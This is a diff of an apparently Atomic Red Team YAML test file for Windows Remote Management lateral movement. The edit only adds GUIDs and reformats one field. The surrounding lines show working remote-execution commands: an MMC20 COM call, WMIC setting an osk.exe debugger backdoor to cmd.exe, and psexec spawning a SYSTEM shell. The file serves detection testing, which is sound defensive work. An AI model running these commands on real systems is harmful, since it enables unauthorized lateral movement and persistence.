@@ -1,8 +1,8 @@
-attack_technique:
-- T1021.006
+attack_technique: T1021.006
 display_name: Windows Remote Management
 atomic_tests:
 - name: Enable Windows Remote Management
+  auto_generated_guid: 9059e8de-3d7d-4954-a322-46161880b9cf
   description: |
     Powershell Enable WinRM
 
@@ -15,6 +15,7 @@ atomic_tests:
     name: powershell
     elevation_required: true
 - name: PowerShell Lateral Movement
+  auto_generated_guid: 6dc74eb1-c9d6-4c53-b3b5-6f50ae339673
   description: |
     Powershell lateral movement using the mmc20 application com object.
 
@@ -35,6 +36,7 @@ atomic_tests:
       [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
     name: powershell
 - name: WMIC Process Call Create
+  auto_generated_guid: 5cd59c3b-1375-4edf-9bac-5851c9915fca
   description: |
     Utilize WMIC to start remote process.
 
@@ -59,6 +61,7 @@ atomic_tests:
       wmic /user:#{user_name} /password:#{password} /node:#{computer_name} process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
     name: command_prompt
 - name: Psexec
+  auto_generated_guid: 9bab84a1-08fd-4245-b681-e62c78283002
   description: |
     Utilize psexec to start remote process.
 
@@ -97,6 +100,7 @@ atomic_tests:
       #{psexec_exe} \\#{computer_name} -u #{user_name} -p #{password} -s cmd.exe
     name: command_prompt
 - name: Invoke-Command
+  auto_generated_guid: 5295bd61-bd7e-4744-9d52-85962a4cf2d6
   description: |
     Execute Invoke-command on remote host.
 
